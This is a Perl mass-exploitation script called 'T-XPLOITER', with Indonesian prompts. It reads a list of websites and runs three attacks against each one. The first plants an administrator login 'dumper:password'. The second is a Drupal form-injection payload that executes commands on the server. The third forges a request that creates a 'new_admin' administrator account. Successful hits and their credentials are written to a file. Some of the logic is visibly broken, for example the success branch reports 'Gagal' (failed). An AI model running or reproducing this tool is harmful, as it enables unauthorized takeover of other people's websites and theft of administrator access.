#!/usr/bin/perl

use LWP::Simple;
use LWP::UserAgent;
use Term::ANSIColor;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);


system 'clear';


sub fazri()
{

print color('green'),"
 :::::::::::             :::    ::: :::::::::  :::        :::::::: ::::::::::: ::::::::::: :::::::::: ::::::::: 
     :+:                 :+:    :+: :+:    :+: :+:       :+:    :+:    :+:         :+:     :+:        :+:    :+: 
    +:+                  +:+  +:+  +:+    +:+ +:+       +:+    +:+    +:+         +:+     +:+        +:+    +:+  
   +#+    +#++:++#++:++  +#++:+   +#++:++#+  +#+       +#+    +:+    +#+         +#+     +#++:++#   +#++:++#:    
  +#+                  +#+  +#+  +#+        +#+       +#+    +#+    +#+         +#+     +#+        +#+    +#+    
 #+#                 #+#    #+# #+#        #+#       #+#    #+#    #+#         #+#     #+#        #+#    #+#     
###                 ###    ### ###        ########## ######## ###########     ###     ########## ###    ###      
";
print color('bold yellow'),"\n
\t\t+=================================================+           [!] T-XPLOITER [!]
\t\t+      Creator  : Anon6372098                     +
\t\t+      Contact  : anon6372098.id@gmail.com        +                             
\t\t+      Team     : D4RK SYST3M F41LUR3 S33K3R      +                  v1.0
\t\t+      Homepage : https://anon6372098.github.io   +     (PROGRAM UNTUK MENDETEKSI CELAH)                                      
\t\t+      Thanks to: All Member of DSFS Official     +
\t\t+      GitHub   : https://github.com/Anon6372098/ +       
\t\t+=================================================+ [!] DETEKSI CELAH DENGAN PROGRAM PERL [!]\n                                                 
";
}




fazri();
print color('bold blue'),"\n\n[+] Masukkan path file --> ";
print color('bold white');
$fazri=<STDIN>;
chomp($fazri);
if(!-e $fazri)
{
while(!-e $fazri)
{
keluar() if($fazri eq 'exit');
print "[-] File tidak ada !\n";
print color('bold blue'),"\n[+] Masukkan path yang berisi website (beserta filenya) --> ";
print color('bold white');
$fazri=<STDIN>;
chomp($fazri);



}

}

print color('bold blue'), "[+] Masukkan nama filenya (ekstensi txt) --> ";
print color('bold white');
$anon=<STDIN>;
chomp($anon);

system 'clear';
fazri();
print color('bold white'),"\n		[!] Ketik 'Fazri' untuk panduan atau 'Anon' untuk memulai atau 'Keluar' [!]\n";

keluar() if($anon eq 'Keluar');
print color('bold cyan'),"\n\Masukkan Perintah --> ";
print color('bold white');
$fazar=<STDIN>;
chomp($fazar);

while(perintah_fazri() eq 0)
{
	print color('bold red'), "\n[-] Perintah tak diketahui, mungkin salah path atau salah perintah !\n";
	print color('bold white'),"Ketik 'Fazri' untuk panduan\n";

	print color('bold cyan'),"\n\Masukkan Perintah --> ";
	print color('bold white');
	$fazar=<STDIN>;
	chomp($fazar);

}


sub perintah_fazri()
{
	while ($fazar eq "-h" or $fazar eq "Fazri" or $fazar eq "cara")
	{
		print color('bold white'),"\n[======================================================]\n";
		print "Ketik '-h', 'Fazri', atau 'cara' untuk menampilkan ini\n";
		print "Ketik 'Anon', 'mulai', atau 'XPloit' untuk mulai\n";
		print "Ketik 'Keluar' untuk keluar";
		print color('bold white'),"\n[======================================================]\n";
		print color('bold cyan'),"\n\Perintah --> ";
		print color('bold white');
		$fazar=<STDIN>;
		chomp($fazar);
	}
	if($fazar eq "Keluar")
	{
		keluar();
	}
	elsif($fazar eq "Anon" or $fazar eq "mulai" or $fazar eq "XPloit")
	{

	system 'clear';
	fazri();

	open my $programmer, '<', $fazri;
	chomp(my @pro = <$programmer>);
	close $programmer;
	$i = 1;
	foreach $mfazri_nizar(@pro)
	{

	print color('bold red'),'[';
	print color('bold green'),"$i";
	print color('bold red'),']';
	print color('bold white'),"$mfazri_nizar";
	print "\n";
		dsfs_team();
		
		print "\n";
	$i++;
	}
	$i=0;
	}
	else
	{

		return 0;
	}
}





sub keluar()
{
fazri();
print color('bold white'),"\n\n Terima kasih telah menggunakan Program ini :) !\n\n";
exit;
}
sub dsfs_team(){


	xploit1();
	xploit2();
	xploit3();
}






sub xploit1()
{
$dsfs = LWP::UserAgent->new(keep_alive => 1);
$dsfs->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$dsfs->timeout (20);

$developer = $situs;
my $fazar = "$mfazri_nizar?url=$mfazri_nizar&submit=submit";
$admin ="dumper";
$pw  ="password";
$gan = $situs . '/user/login';
$hah = $situs . '/user/1';
my $anonpro = $dsfs->get("$fazar")->content;
if($anonpro =~/Success!/) {

open(my $nizar, ">>$anon");
print $nizar " \n 
[Admin] URL : $mfazri_nizar | dumper:password
";
close($nizar);

print color('bold blue'), "		[";
print color('bold red') , "+";
print color('bold blue'), "]";
print color('bold white'),"Add Admin ==> " ;
print color('bold green'), "Berhasil\n";


}
else
{
print color('bold blue'), "	[";
print color('bold red') , "-";
print color('bold blue'), "]";
print color('bold white'),"Add Admin => ";
print color('bold red'), "Gagal\n";
}

}

sub xploit2()
{
my $dsfs = LWP::UserAgent->new;

$fazar = "$mfazri_nizar/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";

$tanggapan = $dsfs->post($fazar, Content => ["form_id" => "user_register_form", "_drupa_ajax" => "1", "mail[#post_render][]" => "exec", "mail[#type]" => "markup", "mail[#markup]" => "Pwned by Drupal Dump3r> dumper.html"]);

$anon_itu_pro = "$mfazri_nizar/vuln.html";
my $content = $dsfs->get("$anon_itu_pro")->content;
if ($content =~ /Vuln/)
{

open(my $nizar, ">>$anon");
print $nizar " \n 
[Shell] URL : $anon_itu_pro
";
close($nizar);
print color('bold blue'), "		[";
print color('bold red') , "+";
print color('bold blue'), "]";
print color('bold white'),"RCE ==> ";
print color('bold green'), "Gagal\n";
}
else{
print color('bold blue'), "	[";
print color('bold red') , "-";
print color('bold blue'), "]";
print color('bold white'),"RCE => ";    
print color('bold red'), "Gagal\n";

}

}

sub xploit3()
{
my $dsfs = LWP::UserAgent->new;

$email = 'new_admin@new_admin.com';
$fazar = "$mfazri_nizar/admin/people/create?render=overlay&render=overlay";
$tanggapan = $dsfs->post($fazar, Content-Type => 'multipart/form-data', Content => ['name' => 'new_admin', 'mail' => $email, 'pass[pass1]' => 'new_password', 'pass[pass2]' => 'new_password', 'status' => '1', 'roles[3]' => '3', 'timezone' => 'Europe/Prague', 'form_build_id' => 'form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY', 'form_token' => 'cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc' , 'form_id' => 'user_register_form' , 'op' => 'Create new account']);

if ($tanggapan =~ /200/)
{
print color('bold blue'), "		[";
print color('bold red') , "+";
print color('bold blue'), "]";
print color('bold white'),"CSRF ==> ";
print color('bold green'), "Berhasil\n";


open(my $nizar, ">>$anon");
print $nizar " \n 
[Admin] URL : $mfazri_nizar | $email:new_password
";
close($nizar);
}
else{
print color('bold blue'), "	[";
print color('bold red') , "-";
print color('bold blue'), "]";
print color('bold white'),"CSRF => ";
print color('bold red'), "Gagal\n";

}

}
